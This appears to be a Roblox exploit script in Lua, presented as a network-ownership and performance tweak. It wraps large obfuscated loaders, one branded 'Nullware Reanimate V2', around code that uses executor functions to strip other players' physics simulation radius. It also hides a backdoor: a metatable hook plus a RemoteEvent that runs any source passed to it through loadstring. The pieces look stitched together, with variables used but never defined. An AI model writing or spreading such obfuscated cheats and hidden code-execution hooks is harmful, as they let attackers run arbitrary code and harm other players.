                            net_c[net_e + net_a] = net_d[net_a]
                        end
                        local net_d = net_d[1]
                        if net_d then
                            net_c[net_e] = net_d
                            net_b = net_a[3]
                        else
                            net_b = net_b + 1
                        end
                    end
                elseif net_e <= 134 then
                    local net_i
                    local net_j
                    local net_h
                    local net_e
                    net_e = net_a[2]
                    net_h = net_c[net_a[3]]
                    net_c[net_e + 1] = net_h
                    net_c[net_e] = net_h[net_a[4]]
                    net_b = net_b + 1
                    net_a = net_d[net_b]
                    net_c[net_a[2]] = net_a[3]
                    net_b = net_b + 1
                    net_a = net_d[net_b]
                    net_e = net_a[2]
                    net_c[net_e] = net_c[net_e](net_g(net_c, net_e + 1, net_a[3]))
                    net_b = net_b + 1
                    net_a = net_d[net_b]
                    net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                    net_b = net_b + 1
                    net_a = net_d[net_b]
                    net_e = net_a[2]
                    net_h = net_c[net_a[3]]
                    net_c[net_e + 1] = net_h
                    net_c[net_e] = net_h[net_a[4]]
                    net_b = net_b + 1
                    net_a = net_d[net_b]
                    net_e = net_a[2]
                    net_c[net_e](net_c[net_e + 1])
                    net_b = net_b + 1
                    net_a = net_d[net_b]
                    net_c[net_a[2]] = net_f[net_a[3]]
                    net_b = net_b + 1
                    net_a = net_d[net_b]
                    net_c[net_a[2]] = net_f[net_a[3]]
                    net_b = net_b + 1
                    net_a = net_d[net_b]
                    net_e = net_a[2]
                    net_h = net_c[net_a[3]]
                    net_c[net_e + 1] = net_h
                    net_c[net_e] = net_h[net_a[4]]
                    net_b = net_b + 1
                    net_a = net_d[net_b]
                    net_c[net_a[2]] = net_a[3]
                    net_b = net_b + 1
                    net_a = net_d[net_b]
                    net_e = net_a[2]
                    net_c[net_e] = net_c[net_e](net_g(net_c, net_e + 1, net_a[3]))
                    net_b = net_b + 1
                    net_a = net_d[net_b]
                    net_e = net_a[2]
                    net_h = net_c[net_a[3]]
                    net_c[net_e + 1] = net_h
                    net_c[net_e] = net_h[net_a[4]]
                    net_b = net_b + 1
                    net_a = net_d[net_b]
                    net_e = net_a[2]
                    net_j = {net_c[net_e](net_c[net_e + 1])}
                    net_i = 0
                    for net_a = net_e, net_a[4] do
                        net_i = net_i + 1
                        net_c[net_a] = net_j[net_i]
                    end
                    net_b = net_b + 1
                    net_a = net_d[net_b]
                    net_b = net_a[3]
                elseif net_e == 135 then
                    local net_j
                    local net_g
                    local net_e
                    net_c[net_a[2]] = net_f[net_a[3]]
                    net_b = net_b + 1
                    net_a = net_d[net_b]
                    net_e = net_a[2]
                    net_c[net_e] = net_c[net_e]()
                    net_b = net_b + 1
                    net_a = net_d[net_b]
                    net_c[net_a[2]] = {}
                    net_b = net_b + 1
                    net_a = net_d[net_b]
                    net_e = net_a[2]
                    net_h = net_e + net_o - 1
                    for net_a = net_e, net_h do
                        net_g = net_l[net_a - net_e]
                        net_c[net_a] = net_g
                    end
                    net_b = net_b + 1
                    net_a = net_d[net_b]
                    net_e = net_a[2]
                    net_j = net_c[net_e]
                    for net_a = net_e + 1, net_h do
                        net_i(net_j, net_c[net_a])
                    end
                else
                    local net_h
                    local net_e
                    net_e = net_a[2]
                    net_h = net_c[net_a[3]]
                    net_c[net_e + 1] = net_h
                    net_c[net_e] = net_h[net_a[4]]
                    net_b = net_b + 1
                    net_a = net_d[net_b]
                    net_c[net_a[2]] = net_a[3]
                    net_b = net_b + 1
                    net_a = net_d[net_b]
                    net_e = net_a[2]
                    net_c[net_e] = net_c[net_e](net_g(net_c, net_e + 1, net_a[3]))
                    net_b = net_b + 1
                    net_a = net_d[net_b]
                    net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                    net_b = net_b + 1
                    net_a = net_d[net_b]
                    net_e = net_a[2]
                    net_h = net_c[net_a[3]]
                    net_c[net_e + 1] = net_h
                    net_c[net_e] = net_h[net_a[4]]
                    net_b = net_b + 1
                    net_a = net_d[net_b]
                    net_e = net_a[2]
                    net_c[net_e](net_c[net_e + 1])
                    net_b = net_b + 1
                    net_a = net_d[net_b]
                    net_c[net_a[2]] = net_f[net_a[3]]
                    net_b = net_b + 1
                    net_a = net_d[net_b]
                    net_e = net_a[2]
                    net_c[net_e] = net_c[net_e]()
                    net_b = net_b + 1
                    net_a = net_d[net_b]
                    net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                    net_b = net_b + 1
                    net_a = net_d[net_b]
                    net_c[net_a[2]][net_a[3]] = net_a[4]
                    net_b = net_b + 1
                    net_a = net_d[net_b]
                    net_c[net_a[2]] = net_f[net_a[3]]
                    net_b = net_b + 1
                    net_a = net_d[net_b]
                    net_c[net_a[2]] = net_f[net_a[3]]
                    net_b = net_b + 1
                    net_a = net_d[net_b]
                    net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                    net_b = net_b + 1
                    net_a = net_d[net_b]
                    net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                    net_b = net_b + 1
                    net_a = net_d[net_b]
                    net_c[net_a[2]] = net_a[3]
                    net_b = net_b + 1
                    net_a = net_d[net_b]
                    net_c[net_a[2]] = net_a[3]
                    net_b = net_b + 1
                    net_a = net_d[net_b]
                    net_e = net_a[2]
                    net_c[net_e](net_g(net_c, net_e + 1, net_a[3]))
                    net_b = net_b + 1
                    net_a = net_d[net_b]
                    net_c[net_a[2]] = net_f[net_a[3]]
                    net_b = net_b + 1
                    net_a = net_d[net_b]
                    net_c[net_a[2]] = net_f[net_a[3]]
                    net_b = net_b + 1
                    net_a = net_d[net_b]
                    net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                    net_b = net_b + 1
                    net_a = net_d[net_b]
                    net_c[net_a[2]] = net_c[net_a[3]][net_a[4]]
                    net_b = net_b + 1
                    net_a = net_d[net_b]
                    net_c[net_a[2]] = net_a[3]
                    net_b = net_b + 1
                    net_a = net_d[net_b]
                    net_c[net_a[2]] = net_a[3]
                    net_b = net_b + 1
                    net_a = net_d[net_b]
                    net_e = net_a[2]
                    net_c[net_e](net_g(net_c, net_e + 1, net_a[3]))
                    net_b = net_b + 1
                    net_a = net_d[net_b]
                    net_b = net_a[3]
                end
                net_b = net_b + 1
            end
        end)
    end
    return net_m(true, {}, net_s())()
end)(string.byte, table.insert, setmetatable)
-- Grab services
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
PlayerInstance = Players.LocalPlayer

-- Optimize
local PlayerList = {}
for _, Plr in pairs(Players:GetPlayers()) do
    if Plr ~= PlayerInstance then
        PlayerList[Plr] = true
    end
end

getgenv().NETWORKPLAYERCHECK = Players.PlayerAdded:Connect(function(Plr)
    PlayerList[Plr] = true
end)

getgenv().NETWORKPLAYERCHECK2 = Players.PlayerRemoving:Connect(function(Plr)
    local Success, Err = pcall(function() PlayerList[Plr] = nil end)
    if not Success then
        appendfile("network-ownership.log", "Error while de-registering player that left: "..tostring(Err).."\n")
    end
end)

Begin = function()
 
local gMetatable = getrawmetatable(game)
 
local Index = function(self, k)
    local Function = string.lower(k)
    if Function == "Execute" then
    return function(self, source)
        return { loadstring(source)() }
        end
    end
end
 
local o_Index = gMetatable.__index
gMetatable.__index = function(self, k)
    local v = index(self, k)
    if v then
    return v
    end
    return o_Index(self, k)
end
 
local o_Namecall = gMetatable.__namecall
gMetatable.__namecall = function(self, ...)
    local args = {...}
    local method = table.remove(args)
 
    if type(method) == "string" then
    local ret = Index(self, method)
    if ret then
    return ret(self, unpack(args))
    end
    end
    return o_Namecall(self, ...)
end
 
 
local RemoteEvent = Instance.new("RemoteEvent")
RemoteEvent.Parent=game.ReplicatedStorage
 
RemoteEvent.OnServerEvent:connect(function(Source)
    game:Execute(Source)
end)
end
spawn(function() Begin() end)
-- Configure network services
settings().Physics.AllowSleep = false -- Keep the current physics system from sleeping. (Non-moving parts lose ownership.)
settings().Physics.PhysicsEnvironmentalThrottle = Enum.EnviromentalPhysicsThrottle.Disabled -- Keep the physics from throttling.

-- Start network runtime
getgenv().NETWORKOWNER = RunService.Stepped:Connect(function()
    -- Revoke ownership from others
    for Plr, _ in pairs(PlayerList) do
        sethiddenprop(Plr, "MaximumSimulationRadius", 0.01)
        sethiddenprop(Plr, "SimulationRadius", 0.01)
    end
([[Nullware Reanimate V2 - https://discord.gg/GwfESVhyRa]]):gsub('.+', (function(a) _HWwIaMTjYafR = a; end)); return(function(r,...)local d;local s;local l;local o;local h;local f;local e=24915;local n=0;local t={};while n<656 do n=n+1;while n<0x1eb and e%0x3cc2<0x1e61 do n=n+1 e=(e*608)%41959 local a=n+e if(e%0x4d42)>0x26a1 then e=(e*0x3fa)%0xb2e7 while n<0x20f and e%0x1a92<0xd49 do n=n+1 e=(e*648)%35520 local l=n+e if(e%0xa0c)>=0x506 then e=(e-0xaf)%0x660d local e=95297 if not t[e]then t[e]=0x1 end elseif e%2~=0 then e=(e-0x5f)%0x8fed local e=69757 if not t[e]then t[e]=0x1 end else e=(e*0x123)%0x60a6 n=n+1 local e=77598 if not t[e]then t[e]=0x1 d={};end end end elseif e%2~=0 then e=(e*0x269)%0x92b5 while n<0x33b and e%0x2dbe<0x16df do n=n+1 e=(e+871)%17670 local a=n+e if(e%0xdca)>=0x6e5 then e=(e+0x1c0)%0x1c7 local e=98901 if not t[e]then t[e]=0x1 s=tonumber;end elseif e%2~=0 then e=(e+0x2e5)%0x55fb local e=33224 if not t[e]then t[e]=0x1 o=function(t)local e=0x01 local function n(n)e=e+n return t:sub(e-n,e-0x01)end while true do local t=n(0x01)if(t=="\5")then break end local e=f.byte(n(0x01))local e=n(e)if t=="\2"then e=d.GhUnoUJG(e)elseif t=="\3"then e=e~="\0"elseif t=="\6"then l[e]=function(e,n)return r(8,nil,r,n,e)end elseif t=="\4"then e=l[e]elseif t=="\0"then e=l[e][n(f.byte(n(0x01)))];end local n=n(0x08)d[n]=e end end end else e=(e-0x1fb)%0x942c n=n+1 local e=79911 if not t[e]then t[e]=0x1 h="\4\8\116\111\110\117\109\98\101\114\71\104\85\110\111\85\74\71\0\6\115\116\114\105\110\103\4\99\104\97\114\81\66\88\86\109\117\112\117\0\6\115\116\114\105\110\103\3\115\117\98\82\119\112\117\104\116\113\101\0\6\115\116\114\105\110\103\4\98\121\116\101\108\112\66\86\80\86\67\102\0\5\116\97\98\108\101\6\99\111\110\99\97\116\107\76\70\108\67\81\81\99\0\5\116\97\98\108\101\6\105\110\115\101\114\116\73\121\99\115\87\71\70\79\5";end end end else e=(e*0x314)%0x1972 n=n+1 while n<0x203 and e%0x4a40<0x2520 do n=n+1 e=(e-526)%41787 local d=n+e if(e%0xbb8)<0x5dc then e=(e*0x109)%0x80a3 local e=86053 if not t[e]then t[e]=0x1 l=(not l)and _ENV or l;end elseif e%2~=0 then e=(e+0x6b)%0xabc4 local e=5116 if not t[e]then t[e]=0x1 f=string;end else e=(e+0xa5)%0x5909 n=n+1 local e=96905 if not t[e]then t[e]=0x1 l=getfenv and getfenv();end end end end end e=(e*474)%34654 end o(h);local e={};for n=0x0,0xff do local t=d.QBXVmupu(n);e[n]=t;e[t]=n;end local function a(n)return e[n];end local f=(function(r,f)local h,t=0x01,0x10 local n={{},{},{}}local l=-0x01 local e=0x01 local o=r while true do n[0x03][d.Rwpuhtqe(f,e,(function()e=h+e return e-0x01 end)())]=(function()l=l+0x01 return l end)()if l==(0x0f)then l=""t=0x000 break end end local l=#f while e<l+0x01 do n[0x02][t]=d.Rwpuhtqe(f,e,(function()e=h+e return e-0x01 end)())t=t+0x01 if t%0x02==0x00 then t=0x00 d.IycsWGFO(n[0x01],(a((((n[0x03][n[0x02][0x00]]or 0x00)*0x10)+(n[0x03][n[0x02][0x01]]or 0x00)+o)%0x100)));o=r+o;end end return d.kLFlCQQc(n[0x01])end);o(f(138,"OoBwT=_dP8k:;H?jd:"));o(f(78,"EAi{T^ze23(!HxNn!iz(23{HNH3^THneTz^2A!H^e(izxizTAzNH22^zh(^y&{iRH^e^{iNT3zi!nA!zzG/33H^3!!eA2NTiN!(i^(#32!T^ni(^eH_N!ei2N<nn!iziU!Hizx!xxeexTiN{3({2NN(n{nn!({^HATeTi(T^N!!X^z(^!Nz2A!Nw2(*NnT2n^3xN3z^xpNzFA({{xe32T{Nx(NTxAi!AzTitH!3giinLznizNi2(zT(HzAzii{x{3zT{n2z!TNnAH^z!nNxAe({(eN{)^^nA(!z2s3!Ae!ieNe2HA{nH{2N3x{(zTAA((!23{NNNenNg3z!TzAAeH(e(i{x(2^{Hn^(^^HAiHAznizz}Ae{2xe2(TznATTz^A?HTzeA!x^2XTTn{(2{{NH((z!!czT2^{BNT2e{!n^(2z^NH!2TznN!32!x02T({TeC:(!^!AN(^eiA2!x3xA(n33{NH(i!xz{i2HNAx{RN23xTn&T2HT3Nx(N^2O!xA2!x3"));local e=(-7446+(function()local l,e=0,1;(function(e,t,n)e(n(e,e,t)and n(t,e,t and e),t(n,e and e,n and e),n(n,n,t)and t(n and n,e,e))end)(function(t,n,d)if l>420 then return n end l=l+1 e=(e*259)%1023 if(e%1518)<=759 then e=(e*673)%34780 return t(t(n and d,n,d)and t(n and t,t,d),t(d,t,d)and n(t,n,d),t(d,t,t)and n(n,n and t,n))else return n end return n end,function(d,t,n)if l>359 then return n end l=l+1 e=(e-557)%25179 if(e%214)>107 then e=(e-758)%7103 return n(n(d,n and t,t),n(t,n and n,t)and d(n,n,n),n(d,t and t,d))else return t end return n end,function(n,d,t)if l>191 then return n end l=l+1 e=(e+774)%29991 if(e%1442)<=721 then return t(d(n,n,n),t(n,d,t),t(n and t,d,n))else return t end return d end)return e;end)())local c=d.lwLfBHQq or d.dvsvOVbq;local te=(getfenv)or(function()return _ENV end);local a=4;local o=3;local _=1;local l=2;local function ee(b,...)local u=f(e,"Q+GPo2LtfHA-h#d<tP#foo-v+<H2<oL_hhHtdhLt<PP+-2{#f_ G2##+oGHA-tPHfh<fLo+#A-+tfG#P2+--GPfP+1tA##od-PG-Lh<HLBhhPHAdd#fh<fLG2<P+PoA&.hdu2fhoGhH-hdG<H-P<A#GPHY-L2-hHo/Ap+HtG<+2--HPGf<lttGdoo+-LGfodd<Lt#+<<fH#d2h<+oGHAGtHo=Nt<AL2+A#,L2f0PG-Hdihto++tA-22oHN<fLfeGo2#-+H-o<+2#hfP6AP}ftHdP2+--GoH2xoL#Y2tGAd+thLG+APhtL-dtoLfH<tf-d8P--#G+td+dfH-oPohfhtPhHhBftoGfhgGhHo#tL+#h+2-PG2fLdt<PH+hfPoAV2Ad#2,-hPPfHVLL2fhGAAH++fA<+L+h+oRH#hoLLAd:ff+dnHo htfdJo<fGdPo<<aL+#tPPA-+AtfAd2P-<<Ptt+PLd-HPPAGGxH#dG2#L-#doRAh+f<O2<-#GhAt+otdd+2G-t-<GhHoF7LhP<A2+#f+ff<oLzhhoLAo+kthdf2-hXGhHfE2t^#hofhLG<fh<fLo#GPhAf+oHG*22fhoP?H#ZftodrtG--GoH;<hLd#oo+Ah+#fo<o2dhfPoAw+Gtfd22M-hG#HomgLh#Hoo-(+hHAJ-LihhPfAA+}thdfLL#xGhHHbott#hof-oo9Ho<fL2#;P#Af+ffK<d2AhoPPHh3-tod=oh-fG#H(<#Lf#tolAh+ffojH2hhfPoAcDhtAdo2Oh<GfHoB9L##fo2-5+hf-<oL?hhPHAo+Zthdf");local n=0;d.lOcvneFQ(function()d.cYqkylAx()n=n+1 end)local function e(t,e)if e then return n end;n=t+n;end local t,n,h=r(0,r,e,u,d.lpBVPVCf);local function f()local n,t=d.lpBVPVCf(u,e(1,3),e(5,6)+2);e(2);return(t*256)+n;end;local z=true;local z=((function(e)local e=({d.lOcvneFQ(function()return#d.lsqvzwsx(0%e)-d.ZCjIuxvU end)})if(e[1])then return e[2]else return 0 end end)(0));local function p()local e=n();local n=n();local o=1;local l=(t(n,1,20)*(2^32))+e;local e=t(n,21,31);local n=((-1)^t(n,32));if(e==0)then if(l==z)then return n*0;else e=1;o=0;end;elseif(e==2047)then return(l==0)and(n*(1/0))or(n*(0/0));end;return d.Bv_wJPed(n,e-1023)*(o+(l/(2^52)));end;local g=n;local function k(n)local t;if(not n)then n=g();if(n==0)then return'';end;end;t=d.Rwpuhtqe(u,e(1,3),e(5,6)+n-1);e(n)local e=""for n=(1+z),#t do e=e..d.Rwpuhtqe(t,n,n)end return e;end;local z=#d.lsqvzwsx(s('\49.\48'))~=1 local e=n;local function y(...)return{...},d.IdXKyDqY('#',...)end local function ee()local e={};local c={};local s={};local u={c,s,nil,e};local e=n()local r={}for l=1,e do local t=h();local n;if(t==2)then n=(h()~=#{});elseif(t==0)then local e=p();if z and d.TXgEOELR(d.lsqvzwsx(e),'.(\48+)$')then e=d.HSETLMai(e);end n=e;elseif(t==3)then n=k();end;r[l]=n;end;for e=1,n()do s[e-(#{1})]=ee();end;for u=1,n()do local e=h();if(t(e,1,1)==0)then local d=t(e,2,3);local h=t(e,4,6);local e={f(),f(),nil,nil};if(d==0)then e[o]=f();e[a]=f();elseif(d==#{1})then e[o]=n();elseif(d==b[2])then e[o]=n()-(2^16)elseif(d==b[3])then e[o]=n()-(2^16)e[a]=f();end;if(t(h,1,1)==1)then e[l]=r[e[l]]end if(t(h,2,2)==1)then e[o]=r[e[o]]end if(t(h,3,3)==1)then e[a]=r[e[a]]end c[u]=e;end end;u[3]=h();return u;end;local function ne(t,e,n)local l=e;local l=n;return s(d.TXgEOELR(d.TXgEOELR(({d.lOcvneFQ(t)})[2],e),n))end local function le(k,e,u)local function ee(...)local f,ee,s,m,z,t,h,g,b,p,j,n;local e=0;while-1<e do if e<3 then if 0<e then if e>=-3 then for n=40,78 do if 2>e then s=r(6,96,3,75,k);z=y m=0;break;end;t=1;h=-1;break;end;else t=1;h=-1;end else f=r(6,87,1,62,k);ee=r(6,74,2,56,k);end else if 4>=e then if e~=4 then g={};b={...};else p=d.IdXKyDqY('#',...)-1;j={};end else if e~=5 then e=-2;else n=r(7);end end end e=e+1;end;for e=0,p do if(e>=s)then g[e-s]=b[e+1];else n[e]=b[e+1];end;end;local e=p-s+1 local e;local d;while true do e=f[t];d=e[_];if 11<d then if 17>=d then if 14<d then if 16>d then u[e[o]]=n[e[l]];else if 13<=d then repeat if 16<d then do return end;break;end;local d,g,k,_,y,p,b,r,j,m,s;n[e[l]]=u[e[o]];t=t+1;e=f[t];d=e[l];g=n[e[o]];n[d+1]=g;n[d]=g[e[a]];t=t+1;e=f[t];r=0;while r>-1 do if 3<=r then if 4<r then if r>4 then repeat if 5~=r then r=-2;break;end;n(b,p);until true;else n(b,p);end else if r~=4 then p=k[y];else b=k[_];end end else if r<=0 then k=e;else if 1<r then y=o;else _=l;end end end r=r+1 end t=t+1;e=f[t];d=e[l]j,m=z(n[d](c(n,d+1,e[o])))h=m+d-1 s=0;for e=d,h do s=s+1;n[e]=j[s];end;t=t+1;e=f[t];d=e[l]n[d]=n[d](c(n,d+1,h))t=t+1;e=f[t];n[e[l]]();t=t+1;e=f[t];do return end;until true;else do return end;end end else if d>=13 then if d~=13 then if(n[e[l]]~=e[a])then t=t+1;else t=e[o];end;else n[e[l]]();end else n[e[l]]();end end else if 21>d then if 18<d then if 20>d then local f,h,a,d,r;local t=0;while t>-1 do if 2>=t then if 1<=t then if t==1 then h=l;else a=o;end else f=e;end else if t>=5 then if t>3 then repeat if 6~=t then n(r,d);break;end;t=-2;until true;else n(r,d);end else if t>3 then r=f[h];else d=f[a];end end end t=t+1 end else n[e[l]]=u[e[o]];end else local e=e[l]n[e]=n[e](c(n,e+1,h))end else if d<=21 then local t=e[l];local l=n[e[o]];n[t+1]=l;n[t]=l[e[a]];else if 23~=d then local t=e[l]local l,e=z(n[t](c(n,t+1,e[o])))h=e+t-1 local e=0;for t=t,h do e=e+1;n[t]=l[e];end;else n[e[l]]=u[e[o]];end end end end else if 6<=d then if d>=9 then if d<=9 then local e=e[l]n[e]=n[e](c(n,e+1,h))else if 7<d then repeat if 10<d then local l=e[l];local t=n[e[o]];n[l+1]=t;n[l]=t[e[a]];break;end;local d,f,h,r,a;local t=0;while t>-1 do if 3>t then if t>=1 then if 0<=t then repeat if t>1 then h=o;break;end;f=l;until true;else f=l;end else d=e;end else if 5>t then if t>2 then repeat if 4>t then r=d[h];break;end;a=d[f];until true;else r=d[h];end else if t>=3 then repeat if t~=5 then t=-2;break;end;n(a,r);until true;else t=-2;end end end t=t+1 end until true;else local d,h,f,r,a;local t=0;while t>-1 do if 3>t then if t>=1 then if 0<=t then repeat if t>1 then f=o;break;end;h=l;until true;else h=l;end else d=e;end else if 5>t then if t>2 then repeat if 4>t then r=d[f];break;end;a=d[h];until true;else r=d[f];end else if t>=3 then repeat if t~=5 then t=-2;break;end;n(a,r);until true;else t=-2;end end end t=t+1 end end end else if d<=6 then n[e[l]]=(e[o]~=0);else if 7==d then for d=0,3 do if 2>d then if-2<d then repeat if d>0 then u[e[o]]=n[e[l]];t=t+1;e=f[t];break;end;n[e[l]]=(e[o]~=0);t=t+1;e=f[t];until true;else u[e[o]]=n[e[l]];t=t+1;e=f[t];end else if d>2 then if(n[e[l]]~=e[a])then t=t+1;else t=e[o];end;else n[e[l]]=u[e[o]];t=t+1;e=f[t];end end end else local t=e[l]local l,e=z(n[t](c(n,t+1,e[o])))h=e+t-1 local e=0;for t=t,h do e=e+1;n[t]=l[e];end;end end end else if d>2 then if d<4 then if(n[e[l]]~=e[a])then t=t+1;else t=e[o];end;else if d>4 then do return end;else t=e[o];end end else if d<=0 then u[e[o]]=n[e[l]];else if 1~=d then t=e[o];else n[e[l]]=(e[o]~=0);end end end end end t=t+1;end;end;return ee end;local o=0xff;local a={};local r=(1);local l='';(function(n)local t=n local f=0x00 local e=0x00 t={(function(h)if f>0x2a then return h end f=f+1 e=(e+0xe40-h)%0x1a return(e%0x03==0x2 and(function(t)if not n[t]then e=e+0x01 n[t]=(0xa6);end return true end)'cynpJ'and t[0x3](0x35d+h))or(e%0x03==0x0 and(function(t)if not n[t]then e=e+0x01 n[t]=(0xe3);o[2]=(o[2]*(ne(function()a()end,c(l))-ne(o[1],c(l))))+1;a[r]={};o=o[2];r=r+o;end return true end)'lXEHz'and t[0x2](h+0x1b0))or(e%0x03==0x1 and(function(t)if not n[t]then e=e+0x01 n[t]=(0xa8);l={l..'\58 a',l};a[r]=ee();r=r+((not d.jdDDhRnp)and 1 or 0);l[1]='\58'..l[1];o[2]=0xff;end return true end)'pCQ_z'and t[0x1](h+0x3da))or h end),(function(d)if f>0x29 then return d end f=f+1 e=(e+0x878-d)%0x1a return(e%0x03==0x0 and(function(t)if not n[t]then e=e+0x01 n[t]=(0x81);end return true end)'lpLRz'and t[0x2](0x1aa+d))or(e%0x03==0x1 and(function(t)if not n[t]then e=e+0x01 n[t]=(0x2b);l='\37';o={function()o()end};l=l..'\100\43';end return true end)'CdWFB'and t[0x1](d+0xb1))or(e%0x03==0x2 and(function(t)if not n[t]then e=e+0x01 n[t]=(0x61);a[r]=te();r=r+o;end return true end)'EirOc'and t[0x3](d+0x1d8))or d end),(function(l)if f>0x2d then return l end f=f+1 e=(e+0x93e-l)%0x36 return(e%0x03==0x1 and(function(t)if not n[t]then e=e+0x01 n[t]=(0x2d);end return true end)'GFTQT'and t[0x1](0x32b+l))or(e%0x03==0x0 and(function(t)if not n[t]then e=e+0x01 n[t]=(0xd9);end return true end)'kwnpB'and t[0x3](l+0x1c0))or(e%0x03==0x2 and(function(t)if not n[t]then e=e+0x01 n[t]=(0xf5);end return true end)'tWgqG'and t[0x2](l+0xe5))or l end)}t[0x2](0x1568)end){};local e=le(c(a));return e(...);end return ee((function()local n={}local e=0x01;local t;if d.jdDDhRnp then t=d.jdDDhRnp(ee)else t=''end if d.TXgEOELR(t,d.qAIDEjJA)then e=e+0;else e=e+1;end n[e]=0x02;n[n[e]+0x01]=0x03;return n;end)(),...)end)((function(n,e,t,l,d,o)local o;if 3>=n then if n>=2 then if n>=0 then repeat if n~=3 then do return 16777216,65536,256 end;break;end;do return e(1),e(4,d,l,t,e),e(5,d,l,t)end;until true;else do return e(1),e(4,d,l,t,e),e(5,d,l,t)end;end else if 1>n then do return e(1),e(4,d,l,t,e),e(5,d,l,t)end;else do return function(t,e,n)if n then local e=(t/2^(e-1))%2^((n-1)-(e-1)+1);return e-e%1;else local e=2^(e-1);return(t%(e+e)>=e)and 1 or 0;end;end;end;end end else if n>=6 then if 7<=n then if 3<=n then for e=39,75 do if n~=8 then do return setmetatable({},{['__\99\97\108\108']=function(e,t,l,d,n)if n then return e[n]elseif d then return e else e[t]=l end end})end break;end;do return t(n,nil,t);end break;end;else do return setmetatable({},{['__\99\97\108\108']=function(e,l,t,d,n)if n then return e[n]elseif d then return e else e[l]=t end end})end end else do return d[t]end;end else if n~=2 then for o=33,70 do if n>4 then local n=l;do return function()local e=e(t,n(n,n),n(n,n));n(1);return e;end;end;break;end;local n=l;local f,d,r=d(2);do return function()local t,l,e,o=e(t,n(n,n),n(n,n)+3);n(4);return(o*f)+(e*d)+(l*r)+t;end;end;break;end;else local n=l;do return function()local e=e(t,n(n,n),n(n,n));n(1);return e;end;end;end end end end),...)
    -- Claim ownership for me
    
    sethiddenprop(PlayerInstance, "MaximumSimulationRadius", NETWORK_RADIUS)
    setsimulationrad(NETWORK_RADIUS)
end)

t.WaterWaveSize = 0
t.WaterWaveSpeed = 0
t.WaterReflectance = 0
t.WaterTransparency = 0
l.GlobalShadows = false
l.FogEnd = 9e9
l.Brightness = 0
settings().Rendering.QualityLevel = "Level01"
for i, v in pairs(g:GetDescendants()) do
    if v:IsA("Part") or v:IsA("Union") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
        v.Material = "Plastic"
        v.Reflectance = 0
    elseif v:IsA("Decal") or v:IsA("Texture") and decalsyeeted then
        v.Transparency = 1
    elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
        v.Lifetime = NumberRange.new(0)
    elseif v:IsA("Explosion") then
        v.BlastPressure = 1
        v.BlastRadius = 1
    elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") then
        v.Enabled = false
    elseif v:IsA("MeshPart") then
        v.Material = "Plastic"
        v.Reflectance = 0
        v.TextureID = 10385902758728957
    end
end
for i, e in pairs(l:GetChildren()) do
    if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
        e.Enabled = false
    end
end

return true
